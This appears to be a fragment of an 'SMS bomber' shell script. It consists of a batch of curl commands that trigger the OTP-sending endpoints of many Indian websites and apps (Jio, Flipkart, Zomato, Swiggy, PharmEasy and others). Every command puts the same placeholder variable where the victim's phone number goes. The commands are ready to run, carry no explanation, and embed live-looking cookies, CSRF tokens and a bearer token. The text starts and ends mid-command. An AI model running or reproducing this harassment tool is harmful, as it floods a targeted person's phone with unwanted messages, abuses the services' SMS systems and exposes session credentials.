  -H 'authorization: Bearer 3d1833da7020e0602165529446587434' \
  -H 'content-type: application/json' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw $'{"operationName":"getOTPOnCall","variables":{"mobileNumber":"+91€tor","loginType":"PATIENT","id":"0c3f4d50-b054-11ed-9846-7b73ab120606"},"query":"query getOTPOnCall($mobileNumber: String, $loginType: LOGIN_TYPE, $id: String\u0021) {\\n  getOTPOnCall(mobileNumber: $mobileNumber, loginType: $loginType, id: $id) {\\n    status\\n    loginId\\n    message\\n    __typename\\n  }\\n}\\n"}' \
  --compressed


#.
#####end

curl 'https://www.jio.com/api/jio-login-service/login/sendOtp' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H $'Cookie: SITESJSESSIONID=2xBk7oI5jR0Y-GRLteTke-R5I6eFEHJs_CWk1Y0TuR4IDRaQ2_Hr\u0021-1907132197\u0021-189704043; JioSessionID=91abf871-8973-4feb-82a1-926728ac283d; ssjsid=91abf871-8973-4feb-82a1-926728ac283d; _gid=GA1.2.578086490.1676730500; _dc_gtm_UA-56816637-12=1; _fbp=fb.1.1676730499901.1776729079; _ga_KTDCM7ZGJS=GS1.1.1676730499.1.0.1676730499.0.0.0; _ga=GA1.1.799732335.1676730500; _gali=inputField' \
  -H 'Origin: https://www.jio.com' \
  -H 'Referer: https://www.jio.com/selfcare/login/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"mobileNumber":"€tor","loginFlowType":"MOBILE","alternateNumber":""}' \
  --compressed
curl 'https://1.rome.api.flipkart.com/api/7/user/otp/generate' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: T=TI166299454322100228265672717137192682858691518106239273611350617071; _pxvid=fc95190e-32aa-11ed-8211-737151746c61; _fbp=fb.1.1665941909264.2016798574; mp_eb8f3be4cfcba5edbd34bdd693d43768_mixpanel=%7B%22distinct_id%22%3A%20%22ACCD8A9F2E5ECD645C2A22F6571FCE95467%22%2C%22%24device_id%22%3A%20%22183efd65c3c5bd-05d60ef2c9bd28-26021f51-144000-183efd65c3d55a%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fseller.flipkart.com%2Fsell-online%2F%22%2C%22%24initial_referring_domain%22%3A%20%22seller.flipkart.com%22%2C%22%24user_id%22%3A%20%22ACCD8A9F2E5ECD645C2A22F6571FCE95467%22%2C%22role%22%3A%20%22Seller%22%2C%22first_login_time%22%3A%201666176146503%2C%22tenant%22%3A%20%22FLIPKART%22%7D; __pxvid=258ea1fa-6f3f-11ed-b670-0242ac120002; fpestid=GQ7LSyjiEQEdlRK9iCvOmb8NOhtTQbDII0YZaaf7o9qJcpbWJPJheR2Pad1p-MteRDWevA; _ga_WG71DKX9SR=GS1.1.1672994504.1.0.1672994513.0.0.0; _gcl_au=1.1.548366073.1673782569; _uetvid=636408804d7911edb2ce593ff927f0d9; mp_9ea3bc9a23c575907407cf80efd56524_mixpanel=%7B%22distinct_id%22%3A%20%22ACCD8A9F2E5ECD645C2A22F6571FCE95467%22%2C%22%24device_id%22%3A%20%22183efd6c9f9528-05f7549b47f46a-26021f51-144000-183efd6c9fa4f5%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22%24user_id%22%3A%20%22ACCD8A9F2E5ECD645C2A22F6571FCE95467%22%7D; _ga=GA1.2.965527632.1665941925; AMCV_55CFEDA0570C3FA17F000101%40AdobeOrg=-227196251%7CMCIDTS%7C19403%7CMCMID%7C44709716357227048839011662891478707677%7CMCAID%7CNONE%7CMCOPTOUT-1676366377s%7CNONE%7CMCAAMLH-1676799947%7C12%7CMCAAMB-1676359176%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI; s_nr=1676359189606-Repeat; _ga_0SJLGHBL81=GS1.1.1676358805.179.1.1676359194.0.0.0; Network-Type=4g; pxcts=266b95d0-af9a-11ed-9744-424d566e787a; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; s_cc=true; K-ACTION=%22RESET%22; gpv_pn=HomePage; gpv_pn_t=FLIPKART%3AHomePage; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C19407%7CMCMID%7C67335531355863488131070626751210808106%7CMCAID%7CNONE%7CMCOPTOUT-1676738302s%7CNONE%7CMCAAMLH-1670775236%7C12%7CMCAAMB-1676731059%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI; _px3=5a1836ee925c44b8db9a36ae244ec84c25ed27cd86e41995ebce2b567df01e05:pB4Jm1wOQ5hhkGwnBxbSylDAENKnVz4rtmXvwcs7RiL7Wk8ymK04K1fdbpYTB69RCCEvJ8wAD8k1amA5R9qiUQ==:1000:42EvqeDWkmgNx+uBvc0DEGQ6KG3pAydDUc+IA8g258/EJ2KaRz1WFHW8Jo+Lm3J99wqxsFj0zqmmkSaLzW8JNFwLcxw/0XhrgvtsnXphrbax0c3rJwJCgA2ZltHKSUrWmZ1uaRbdEffsoV5PBQ3f4lTuBuUr4jwgBw+Fpw4nd56ZtQ8Xwx65nF1vS8JoGwAvn+PKZ+dggWGDo7+AtjWMvA==; S=d1t13Pz8/Wz8/Pz8/Dz8/Yz8/PyIsll/3B7mwceLdKxh0Mig11kevMhuHwXx1xLm+oIF8gmSojskEnrKYTI6CKdTSYQ==; SN=VI65467C99D5D94A88B0272945D2537F29.TOKDFD9DEE4F4BB427EBA0252BD4649C2EE.1676731273.LO; s_sq=%5B%5BB%5D%5D' \
  -H 'Origin: https://www.flipkart.com' \
  -H 'Referer: https://www.flipkart.com/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-site' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'X-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 FKUA/website/42/website/Desktop' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"loginId":"+91€tor"}' \
  --compressed
curl 'https://pharmeasy.in/apt-api/login/send-otp' \
  -H 'authority: pharmeasy.in' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: XdI=5_CLziIk-Z-UzV9fADhfE; XPESD=%7B%22session_id%22%3A%22s_w_5_CLziIk-Z-UzV9fADhfE_1676731430000%22%2C%22session_id_flag%22%3A%22ct_id%22%2C%22referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22session_start_time%22%3A%222023-02-18T14%3A43%3A50.431Z%22%7D; XPESS_v2=s_w_5_CLziIk-Z-UzV9fADhfE_1676731430000; _gcl_au=1.1.94281476.1676731432; dtm_token_sc=AQEKjT3XGJoDGwEh4rcaAQEBAQA; _gid=GA1.2.1474380513.1676731432; _gat_UA-60621013-1=1; dtm_token=AQEKjT3XGJoDGwEh4rcaAQEBAQA; _ga=GA1.1.600542235.1676731432; _ga_J4XE9SW84F=GS1.1.1676731432.1.1.1676731432.60.0.0; WZRK_G=49b7952d33c54ae6bf2925d2721b665e; _fbp=fb.1.1676731437921.460723146; WZRK_S_R9Z-WWR-854Z=%7B%22p%22%3A1%2C%22s%22%3A1676731584%2C%22t%22%3A1676731437%7D' \
  -H 'origin: https://pharmeasy.in' \
  -H 'referer: https://pharmeasy.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-instana-l: 1,correlationType=web;correlationId=b93fcd3cc87cdd26' \
  -H 'x-instana-s: b93fcd3cc87cdd26' \
  -H 'x-instana-t: b93fcd3cc87cdd26' \
  --data-raw '{"param":"€tor"}' \
  --compressed
curl 'https://accounts.zomato.com/login/phone' \
  -H 'authority: accounts.zomato.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: multipart/form-data; boundary=----WebKitFormBoundarywon1ZNqyBEuGcv9i' \
  -H 'cookie: rd=1380000; fbtrack=61e3f87311ceecc9d51e2609faf532f1; cid=2c4e3ed9-0308-4d16-a237-3a5c99f7e944; zrt_3a5c99f7e944=eO67ep2-SBpSkWDTtqcPxOVx2eoWE8NpZ9igsi2TbDI.ZgB1LGAzmKZCJFwhRRyu-SKzDgMEND8j8bbQnmI3OwU; zat=sOCx2rpxJpp5delkrapgQgYKk_ZW_Ilz0bTusLUeLUU.o-BHYolzen5s_0T_jG23j3M57YF_w7mhmhlwkkQOHT4; ttaz=1663499912; hy-en=1; _gcl_au=1.1.1729039832.1672581174; _fbp=fb.1.1672581174162.1631487211; expab=1; dpr=2; PHPSESSID=16833d13b04bd8ec107b5283d62b8717; csrf=aaa1e77cff99a5e93f1391bb9f43e0db; fbcity=1; zl=en; ak_bmsc=3EAF980831A5985B7748B265C5CED218~000000000000000000000000000000~YAAQzmPUF2t5b1yGAQAAdlMDZRLknGL5g7QNDgh0GbldbQ8cb542mTpbWQCB+mChZLBYRLLJNZs51H+1M1KE2GXopSOueCosdf8urUKAVKZjtLZ8DqhuXboFiRlhP608TCy5v5y2Xhj4oCZJfKHCEltmg6XUHOxqjfeUFaQm0QsJm7+fC5WIquiAR8I03hG6rHlOmhf3ufcXgtJhtNN1gJZ/a03ZIrudWX7dm/8UVwQ4aMNCHyo9LbNGcozTTpfAC0aDEwucSrd45pt/NW+FI9M4DZTSYXnG26PFWTZFm6WkIekkJtdUDuKBddb/KbGTuJwFIa91/EDQ9qVa1+wzA9EKMfY1jWFTG8gLYnC1CBTTRlPtYG+zMunAkeY2CRtJoGkV6+XZu9KvGeY=; _gid=GA1.2.440842435.1676731812; _gat_global=1; _gat_city=1; _gat_country=1; fre=0; _ga_2XVFHLPTVP=GS1.1.1676731813.5.0.1676731813.0.0.0; _ga=GA1.1.222442728.1660907299; oauth2_authentication_csrf=MTY3NjczMTk3M3xEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJR1ZsTm1KaVpXTmxaV1psT0RRM056QmhZelEyWmpGallXWXlOek0wWlRjMHxI0Ofs9pAz-DPtkW-8Tilflw8uYqs7Jb8WO0MwJOacVQ==; AKA_A2=A; zxcv=4436767029ba2b5dffc404c9318bffc28845125f949dfc1c5a8fecab; cid=2c4e3ed9-0308-4d16-a237-3a5c99f7e944; purl=https://www.zomato.com; callback=; G_ENABLED_IDPS=google' \
  -H 'origin: https://accounts.zomato.com' \
  -H 'referer: https://accounts.zomato.com/zoauth/login?login_challenge=400c6068d99947e6a3f5c8245e627cf9' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-zomato-csrft;' \
  --data-raw $'------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="country_id"\r\n\r\n1\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="number"\r\n\r\n€tor\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="type"\r\n\r\ninitiate\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="hash"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="id_token"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="fb_token"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="email"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="name"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="otp"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="csrf_token"\r\n\r\naaa1e77cff99a5e93f1391bb9f43e0db\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="lc"\r\n\r\n400c6068d99947e6a3f5c8245e627cf9\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="verification_type"\r\n\r\nsms\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="message_uuid"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="theme"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i--\r\n' \
  --compressed

curl 'https://www.swiggy.com/dapi/auth/sms-otp' \
  -H 'authority: www.swiggy.com' \
  -H '__fetch_req__: true' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: __SW=CYag00bMdyySC1m1woD1g9iuNA2Q3Gk-; _guest_tid=6c10abe9-1bc3-4daf-860d-e3eeca404c5c; _is_logged_in=; _device_id=1d6990ec-bd7e-2d03-ca19-9b7a378b72cc; _sid=5h87f6bd-f62d-4a98-8fc4-68434252c9cf; fontsLoaded=1; _gcl_au=1.1.2129486398.1676731979; _gid=GA1.2.2119851383.1676731980; _gat_0=1; WZRK_G=9944d0f57cc04d649846794fa9f1e233; _ga=GA1.1.1616598371.1676731980; WZRK_S_W86-ZZK-WR6Z=%7B%22p%22%3A1%2C%22s%22%3A1676732131%2C%22t%22%3A1676731980%7D; _ga_34JYJ0BCRN=GS1.1.1676731980.1.1.1676731994.0.0.0' \
  -H 'origin: https://www.swiggy.com' \
  -H 'referer: https://www.swiggy.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"mobile":"€tor","_csrf":"4QfCUHREQUpv-blC01cQBRzTY41dSeJGH30alxjQ"}' \
  --compressed

curl 'https://mtnucleus.byjusweb.com/api/acs/v2/send-otp' \
  -H 'authority: mtnucleus.byjusweb.com' \
  -H 'accept: application/json, text/javascript, */*; q=0.01' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://byjus.com' \
  -H 'referer: https://byjus.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: cross-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"phoneNumber":"€tor","page":"free-trial-classes"}' \
  --compressed

curl 'https://api.sso.masaischool.com/mobile-signup-send-otp' \
  -H 'authority: api.sso.masaischool.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: _hjSessionUser_2119938=eyJpZCI6ImFjY2M4MzRlLTRmMmEtNTYwOS1hYzc4LWZhYmM2NDAyZDdkMSIsImNyZWF0ZWQiOjE2NTcyMTczODgwODUsImV4aXN0aW5nIjp0cnVlfQ==; _gcl_au=1.1.1376926357.1676732482; _gid=GA1.2.1311796423.1676732483; _gat_UA-143003758-1=1; WZRK_S_6XL-S15-SL8A=%7B%22p%22%3A1%7D; _fbp=fb.1.1676732484196.929525330; _ga=GA1.3.1968225207.1676732483; _gid=GA1.3.1311796423.1676732483; _ga=GA1.2.1968225207.1676732483; _ga_1T4T8PN99C=GS1.1.1676732484.1.1.1676732487.0.0.0; _ga_GPPD2PTVSL=GS1.1.1676732482.1.1.1676732515.27.0.0' \
  -H 'origin: https://sso.masaischool.com' \
  -H 'referer: https://sso.masaischool.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"mobileNumber":"+91€tor","name":"kalwar"}' \
  --compressed



curl 'https://www.dealshare.in/api/1.0/get-otp' \
  -H 'authority: www.dealshare.in' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: _ga=GA1.1.8904892.1676565535; _fbp=fb.1.1676565536588.2105632294; WZRK_G=114b4b57bbe84314a56457daa2e84b71; WZRK_S_675-6K9-W76Z=%7B%22p%22%3A1%2C%22s%22%3A1676728612%2C%22t%22%3A1676728460%7D; _ga_17JC851ECY=GS1.1.1676728459.6.0.1676728461.0.0.0' \
  -H 'origin: https://www.dealshare.in' \
  -H 'referer: https://www.dealshare.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"phoneNumber":"€tor","name":"","hashCode":"","resendOtp":0,"source":"web"}' \
  --compressed

curl 'https://login.web.ajio.com/api/auth/generateLoginOTP' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'accept: application/json' \
  -H 'content-type: application/json' \
  -H 'Referer: https://www.ajio.com/' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"mobileNumber":"€tor"}' \
  --compressed


curl 'https://api.penpencil.co/v1/users/resend-otp?smsType=2' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'client-version: 192' \
  -H 'Authorization: Bearer' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Referer: https://www.pw.live/' \
  -H 'randomId: 39e97e18-72cd-4378-8d1a-28e4153812b6' \
  -H 'client-id: 5eb393ee95fab7468a79d189' \
  -H 'Client-Type: WEB' \
  -H 'sec-ch-ua-platform: "Android"' \
  --data-raw '{"mobile":"€tor","organizationId":"5eb393ee95fab7468a79d189"}' \
  --compressed

curl 'https://in.vclubhouse.xyz/api/sms/ali_send' \
  -H 'authority: in.vclubhouse.xyz' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'origin: https://www.vclub.in' \
  -H 'referer: https://www.vclub.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: cross-site' \
  -H 'token;' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
  --data-raw 'mobile=91€tor' \
  --compressed

curl 'https://gql.meatigo.com/' \
  -H 'authority: gql.meatigo.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.meatigo.com' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
  --data-raw '{"query":"\n      query($input: mobileInput){\n        getOTP(input: $input) {\n          code\n          message\n          causes\n          totalElements\n          data {\n            mobile\n            returningUser\n          }\n        }\n      }\n    ","variables":{"input":{"mobile":"€tor","communicationPreference":true}}}' \
  --compressed

curl 'https://session-service.aakash.ac.in/prod/sess/api/v1/user/phone/otp/' \
  -H 'authority: session-service.aakash.ac.in' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: max-age=0' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.aakash.ac.in' \
  -H 'referer: https://www.aakash.ac.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
  -H 'x-client-id: a6fbf1d2-27c3-46e1-b149-0380e506b763' \
  --data-raw '{"action":"generate","phone":"€tor","access":"signup"}' \
  --compressed

curl 'https://api.prod.astrotalk.in/AstroTalk/login/v2/user/mobile-otp-login' \
  -H 'authority: api.prod.astrotalk.in' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryFt4CyQkJLaxELnmd' \
  -H 'origin: https://astrotalk.com' \
  -H 'referer: https://astrotalk.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: cross-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw $'------WebKitFormBoundaryFt4CyQkJLaxELnmd\r\nContent-Disposition: form-data; name="countryCode"\r\n\r\n+91\r\n------WebKitFormBoundaryFt4CyQkJLaxELnmd\r\nContent-Disposition: form-data; name="isCall"\r\n\r\nfalse\r\n------WebKitFormBoundaryFt4CyQkJLaxELnmd\r\nContent-Disposition: form-data; name="appId"\r\n\r\n3\r\n------WebKitFormBoundaryFt4CyQkJLaxELnmd\r\nContent-Disposition: form-data; name="businessId"\r\n\r\n1\r\n------WebKitFormBoundaryFt4CyQkJLaxELnmd\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n€tor\r\n------WebKitFormBoundaryFt4CyQkJLaxELnmd--\r\n' \
  --compressed

curl 'https://api.khatabook.com/v1/auth/request-otp' \
  -H 'authority: api.khatabook.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://khatabook.com' \
  -H 'referer: https://khatabook.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-kb-app-locale: en' \
  -H 'x-kb-app-name: Khatabook Website' \
  -H 'x-kb-app-version: 000100' \
  -H 'x-kb-new-auth: false' \
  -H 'x-kb-platform: web' \
  --data-raw '{"country_code":"+91","phone":"€tor","app_signature":"Jc/Zu7qNqQ2"}' \
  --compressed

curl 'https://ullu.app/ulluCore/api/v1/otp/send/new/cdiOpn?mobileNumber=€tor' \
  -X 'POST' \
  -H 'authority: ullu.app' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-length: 0' \
  -H 'cookie: _fbp=fb.1.1677319678822.2078989441; _ga=GA1.1.1987362526.1677319681; _ga_QPY6BPK7QN=GS1.1.1677319680.1.0.1677319680.0.0.0; __stripe_mid=8681bbd2-3f34-4480-a035-ae9db46014ae2da475; __stripe_sid=974528c1-7f46-46dd-bc8d-dfebd44e4ed1e5a844' \
  -H 'origin: https://ullu.app' \
  -H 'referer: https://ullu.app/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --compressed

curl 'https://api.countrydelight.in/api/auth/new_request_otp' \
  -H 'authority: api.countrydelight.in' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: text/plain' \
  -H 'origin: https://countrydelight.in' \
  -H 'referer: https://countrydelight.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"mobile_no":"€tor","new_user":true}' \
  --compressed

curl 'https://www.khelplayrummy.com/component/weaver/?task=registration.otpBasedCommonAjaxFunction' \
  -H 'authority: www.khelplayrummy.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
